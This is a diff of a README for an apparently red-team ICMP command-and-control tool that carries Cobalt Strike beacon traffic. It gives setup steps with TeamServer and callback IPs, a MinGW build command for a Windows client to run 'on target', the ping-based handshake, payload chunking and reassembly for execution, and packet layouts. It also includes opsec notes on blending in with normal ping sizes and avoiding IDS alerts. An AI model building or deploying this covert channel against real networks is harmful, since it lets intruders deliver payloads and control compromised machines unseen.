@@ -1,166 +1,200 @@
 # ICMP C2 Protocol Overview
 
-This document provides a high‐level description of how our ICMP-based command-and-control (C2) channel works. It explains the core handshake (Type 8 → Type 0) and how larger payloads are fragmented and reassembled.
-
----
 
 ## Key Concepts
 
 - **ICMP Echo Request (Type 8)**: Used by the client (“agent”) to signal the server (“controller”) and request data.
 - **ICMP Echo Reply (Type 0)**: Used by the controller to embed and send replies (including large payloads) back to the client.
-- **TAG (4 bytes)**: A fixed 4-byte marker (e.g. `RQ47`) prepended to every ICMP payload, so that unrelated OS pings or network noise are ignored.
-- **Chunking**: When the controller needs to send more data than fits in one ICMP packet (500 bytes), it splits the payload into multiple fragments. Each fragment still carries the same 4-byte tag.
+- **TAG (4 bytes)**: A fixed 4‐byte marker (e.g. `RQ47`) prepended to every ICMP payload, so that unrelated OS pings or network noise are ignored.
+- **ICMP_PAYLOAD_SIZE (default 1000 bytes)**: Defines how many bytes we can carry in each ICMP packet’s data‐field. In both `controller.py` and `client_x86.c`, this is set to 1000 by default.  
+    > Opsec: Windows default payload size is 32 bytes, where UNIX is 52. 
+- **Chunking**: When the controller needs to send more data than fits in a single ICMP payload (1000 bytes), it splits the payload into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE = 1000 – 4). Each fragment still carries the same 4‐byte tag.
 
 ---
+
 # Setup:
 
-1. Install dependencies:
+1. **Install dependencies:**
 
-```
-sudo apt install libpcap0.8-dev
-```
+   ```bash
+   sudo apt install libpcap0.8-dev
+   ```
 
-```
-pip install -r Controller/Python/requirements.txt
-```
+   ```bash
+   pip install -r Controller/Python/requirements.txt
+   ```
 
+2. **Start an External C2 beacon in Cobalt Strike (TeamServer).**
 
-2. Start an External C2 beacon in CS
+3. **Edit the following fields in these files to fit your enviornment:**
 
-3. Edit the following fields in these files:
+   - **`Controller/Python/controller.py`:**
+     ```python
+     TEAMSERVER_IP   = "10.10.10.21"  # Change to your TeamServer’s IP (e.g. 127.0.0.1 if running locally)
+     TEAMSERVER_PORT = 2222          # Change to TeamServer’s listening port
+     # (These must stay in sync with how your Beacon is configured.)
+     ICMP_TAG = "RQ47"              # The ICMP tag, MUST match client
 
-`controller.py`:
-```
-TEAMSERVER_IP = "10.10.10.21" # change to Teamserver IP (127.0.0.1 works if running on same box)
-TEAMSERVER_PORT = 2222        # Change to Teamserver Port
-```
+     BEACON_PIPENAME = "foobar"     # Name of pipe to communicate over between the Beacon & Client
+     BEACON_ARCH = "x86"            # what architecture is the client - used for payload generation
+     ```
+   - **`client_x86.c`:**
+     ```c
+     #define ICMP_CALLBACK_SERVER "172.19.241.197"  // Change to your Controller’s IP
+     #define ICMP_PAYLOAD_SIZE      1000           // Must match controller.py‘s ICMP_PAYLOAD_SIZE
+     #define ICMP_TAG               "RQ47"         // 4‐byte tag (can be changed, but must match controller)
+     #define PIPENAME               "\\\\.\\pipe\\foobar"  // Named pipe as configured by the Controller’s pipename
+     ```
 
-`client_x86.c`:
-```
-#define ICMP_CALLBACK_SERVER "172.19.241.197" //change to controller IP
-```
+   There are other tunable constants in both files (e.g. `SLEEP_TIME` in the client, `PIPENAME`, etc.). Review each file’s top‐section comments for details.
 
-There are other fields you can edit in both `controller.py` and `client_x86.c`,
-see each file for those settigns
+4. **Compile the client (Windows build target):**
 
-4. Compile the Client `i686-w64-mingw32-gcc client_x86.c -o client_x86.exe -lws2_32`
-> 64 bit mingw may work as well, I have not tested this yet.
+   ```bash
+   i686-w64-mingw32-gcc client_x86.c -o client_x86.exe -lws2_32
+   ```
+   > You may also try a 64-bit MinGW compile (`x86_64-w64-mingw32-gcc ...`) but only the 32-bit build has been fully tested.
 
-5. run `python3 Controller/Python/controller.py`
+5. **Run the controller:**
 
-5. Run the compiled `client_x86.exe` on target.
+   ```bash
+   python3 Controller/Python/controller.py
+   ```
+
+6. **Run the compiled client on the target:**
+
+   ```bash
+   client_x86.exe
+   ```
 
 ---
+
 ## Overall Flow
 
 1. **Client: “Seq 0” Size Request**  
    - The client opens a raw ICMP socket.  
-   - It builds a small ICMP Echo Request (Type 8) whose payload is:  
+   - It builds an ICMP Echo Request (Type 8) whose payload is:
      ```
      [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_expected]
-     ```  
-   - The client sends this as **sequence 0**.  
+     ```
+     and sends it with **sequence number 0**.  
    - Purpose: inform the controller how many bytes of data it plans to receive.
 
 2. **Controller: Immediate “Seq 0” Reply (Size Confirmation)**  
-   - The controller’s sniffer sees an ICMP packet where:  
+   - The controller’s sniffer sees an ICMP packet where:
      - Type == 8 (Echo Request)  
      - Payload starts with `TAG`  
      - Sequence == 0  
-   - It extracts the 4-byte length, allocates a receive buffer of that size, and immediately responds with an ICMP Echo Reply (Type 0), also marked as **sequence 0**. Its payload is:  
+   - It extracts the 4-byte length, allocates a receive buffer of that size, and immediately responds with an ICMP Echo Reply (Type 0), also with **sequence 0**. Its payload is:
      ```
      [TAG (4 bytes)] [4-byte big-endian integer: total_bytes_to_send]
-     ```  
+     ```
    - This confirms to the client that the server is ready to send exactly that many bytes.
 
-3. **Controller: Sending Data Fragments (Seq 1..N)**  
-   - If the data to send exceeds the single-packet limit (≈500 bytes total), the controller splits it into fragments of up to (500 − 4) = 496 bytes each.  
-   - For each fragment **i** (starting at 1), the controller sends an ICMP Echo Reply (Type 0) with:  
+3. **Controller: Sending Data Fragments (Seq 1…N)**  
+   - If the data to send exceeds **1000 bytes**, the controller splits it into fragments of up to **996** bytes each (ICMP_PAYLOAD_SIZE – TAG_SIZE).  
+   - For each fragment **i** (starting at 1), the controller sends an ICMP Echo Reply (Type 0) with:
+     ```text
+     Sequence = i
+     Payload  = [TAG][next 996 bytes of data]
      ```
-     Sequence = i  
-     Payload = [TAG][next 496 bytes of data]
-     ```  
-   - If the payload fits in one chunk, only “seq 1” is used. Otherwise, multiple replies arrive in sequence.
+   - If the full payload fits within one chunk (≤ 996 bytes of data), only **seq 1** is used. Otherwise, multiple replies arrive in sequence.
 
 4. **Client: Reassembly Loop**  
-   - After sending “seq 0” and waiting, the client’s raw socket filters incoming packets, accepting only:  
+   - After sending “seq 0” and waiting, the client’s raw socket filters incoming packets, accepting only:
      - ICMP packets of Type 0 (Echo Reply)  
      - Matching its own process ID  
      - Payload beginning with `TAG`  
-   - When **seq 0** arrives, the client reads the 4-byte length, allocates a buffer, and computes how many fragments it expects:  
+   - When **seq 0** arrives, the client reads the 4-byte length, allocates a buffer, and computes how many fragments it expects:
      ```
-     total_chunks = ceil(total_size / 496)
-     ```  
-   - For each subsequent reply **seq = 1..total_chunks**, the client copies the data portion (i.e., bytes after the TAG) into the right offset in the buffer. Once all fragments are received, the full payload is ready for execution or further processing.
+     data_per_chunk = ICMP_PAYLOAD_SIZE – TAG_SIZE  # = 1000 – 4 = 996
+     total_chunks   = ceil(total_size / 996)
+     ```
+   - For each subsequent reply **seq = 1…total_chunks**, the client copies the data portion (i.e., the bytes after the 4-byte TAG) into the correct offset in the buffer. Once all fragments are received, the full payload is ready for execution or further processing.
 
 5. **Beaconing & TeamServer Forwarding (Seq > 0)**  
-   - After the initial C2 payload, the client may send extra frames (e.g., “beacon” or “task” data). Each of these is sent as an ICMP Echo Request (Type 8) with:  
+   - After the initial C2 payload, the client may send extra frames (e.g., Beacon or task data). Each of these is sent as an ICMP Echo Request (Type 8) with:
      ```
-     Sequence = X (> 0)  
-     Payload = [TAG][user_data…]
-     ```  
-   - The controller, upon spotting `seq > 0`, strips `TAG` and forwards the remaining bytes to the TeamServer over a TCP socket.  
-   - Any response from the TeamServer is sent back in a single ICMP Echo Reply (Type 0) with:  
+     Sequence = X (> 0)
+     Payload  = [TAG][user_data…]
      ```
-     Sequence = X  
-     Payload = [TAG][TeamServer_response]
-     ```  
-   - This ensures a 1:1 mapping of in-flight beacon frames to replies, using the same sequence number to correlate.
+   - The controller, upon spotting **seq > 0**, strips `TAG` and forwards the remaining bytes to the TeamServer over a TCP socket.  
+   - Any response from the TeamServer is sent back in a single ICMP Echo Reply (Type 0) with:
+     ```
+     Sequence = X
+     Payload  = [TAG][TeamServer_response]
+     ```
+   - This ensures a 1:1 mapping of in‐flight Beacon frames to replies, using the same sequence number to correlate.
 
 ---
 
 ## Packet Structure Summary
 
+> **Constants** (both sides):
+> ```text
+> ICMP_PAYLOAD_SIZE = 1000      # bytes available for data+TAG
+> TAG_SIZE          = 4         # bytes (e.g. “RQ47”)
+> MAX_DATA_PER_CHUNK = 1000 – 4 = 996  # actual data per chunk
+> ```
+>
+> **Note**: The 4-byte TAG is always the first 4 bytes of every payload, so each chunk’s data is at most 996 bytes.
+
 - **Client → Controller (Seq 0)**  
-  ```
-  IP Header (20 bytes)
-  └─ ICMP Header (8 bytes): Type=8, Code=0, ID=<PID>, Seq=0
-     └─ Payload (500 bytes total): [“RQ47”][4-byte total_size][padding…]
+  ```text
+  IP Header      : 20 bytes
+    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=0)
+        └─ Payload   : 1000 bytes total
+              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
   ```
 
 - **Controller → Client (Seq 0 Reply)**  
-  ```
-  IP Header (20 bytes)
-  └─ ICMP Header (8 bytes): Type=0, Code=0, ID=<PID>, Seq=0
-     └─ Payload (500 bytes total): [“RQ47”][4-byte total_size][padding…]
+  ```text
+  IP Header      : 20 bytes
+    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=0)
+        └─ Payload   : 1000 bytes total
+              [ “RQ47” ][ 4-byte total_size ][ padding… (up to 992 bytes) ]
   ```
 
 - **Controller → Client (Seq i Reply)**  
-  ```
-  IP Header (20 bytes)
-  └─ ICMP Header (8 bytes): Type=0, Code=0, ID=<PID>, Seq=i
-     └─ Payload (<=500 bytes): [“RQ47”][up to 496 bytes of data]
+  ```text
+  IP Header      : 20 bytes
+    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
+        └─ Payload   : ≤ 1000 bytes
+              [ “RQ47” ][ up to 996 bytes of data ]
   ```
 
 - **Client → Controller (Seq i Request, after C2 payload)**  
-  ```
-  IP Header (20 bytes)
-  └─ ICMP Header (8 bytes): Type=8, Code=0, ID=<PID>, Seq=i
-     └─ Payload (<=500 bytes): [“RQ47”][up to 496 bytes of beacon/command data]
+  ```text
+  IP Header      : 20 bytes
+    └─ ICMP Header  : 8 bytes   (Type=8, Code=0, ID=<PID>, Seq=i)
+        └─ Payload   : ≤ 1000 bytes
+              [ “RQ47” ][ up to 996 bytes of Beacon/command data ]
   ```
 
 - **Controller → Client (Seq i Reply, TeamServer data)**  
-  ```
-  IP Header (20 bytes)
-  └─ ICMP Header (8 bytes): Type=0, Code=0, ID=<PID>, Seq=i
-     └─ Payload (<=500 bytes): [“RQ47”][TeamServer response data]
+  ```text
+  IP Header      : 20 bytes
+    └─ ICMP Header  : 8 bytes   (Type=0, Code=0, ID=<PID>, Seq=i)
+        └─ Payload   : ≤ 1000 bytes
+              [ “RQ47” ][ TeamServer response data ]
   ```
 
-
+---
 
 <!-- ## Advantages & Caveats
 
-- **Quietness**: Leverages legitimate ICMP traffic.  
-- **Minimal Dependencies**: Only raw sockets and basic ICMP parsing.  
-- **Fragility**: No built-in session encryption or integrity checks—relying solely on the 4-byte TAG for filtering.  
-- **IDS/Firewall Risk**: Large or unusual ICMP payloads may trigger alerts. Payloads are chunked to 496 bytes to avoid fragmentation, but the TAG may still look suspicious.
+- **Quietness**: Leverages legitimate ICMP traffic.
+- **Minimal Dependencies**: Only raw sockets (client) and basic Scapy (controller) are needed.
+- **Fragility**: No built-in session encryption or integrity checks—relying solely on the 4-byte TAG for filtering.
+- **IDS/Firewall Risk**: Large or unusual ICMP payloads may trigger alerts. We chunk at 996 bytes to avoid IP‐level fragmentation, but the TAG may still look suspicious.
 
 ---
 
 ## Usage Notes
 
-1. **Client setup**: Must open a raw ICMP socket with permission.  
-2. **Controller setup**: Needs elevated privileges to sniff and send raw ICMP.  
-3. **Tag matching**: Both sides ignore any ICMP not starting with `RQ47`, preventing OS replies from disrupting reassembly.  
-4. **Timeouts**: The client’s recv loop should have a timeout (e.g. 5 seconds) to abort if fragments never arrive.  
-5. **TeamServer traffic**: After the initial C2 payload, any “seq > 0” Echo Requests are forwarded to the TeamServer over plain TCP; replies come back in a single ICMP Echo  -->
+1. **Client setup**: Must run as an administrator (Windows) to open a raw ICMP socket, or as root (Linux) if you port the code there.
+2. **Controller setup**: Needs elevated privileges to sniff/send raw ICMP (via Scapy).
+3. **Tag matching**: Both sides ignore any ICMP not starting with `RQ47`. This prevents OS‐generated pings from disrupting the reassembly logic.
+4. **Timeouts**: The client’s `recv_icmp_fragments()` has no explicit timeout per‐packet, so if fragments never arrive, it will block indefinitely. You may want to add a `setsockopt(..., SO_RCVTIMEO, ...)` or similar.
+5. **TeamServer traffic**: After the initial C2 payload is delivered, any “seq > 0” ICMP Echo Requests are forwarded to the TeamServer over a plain TCP connection; replies come back in Echo Replies.
+ -->
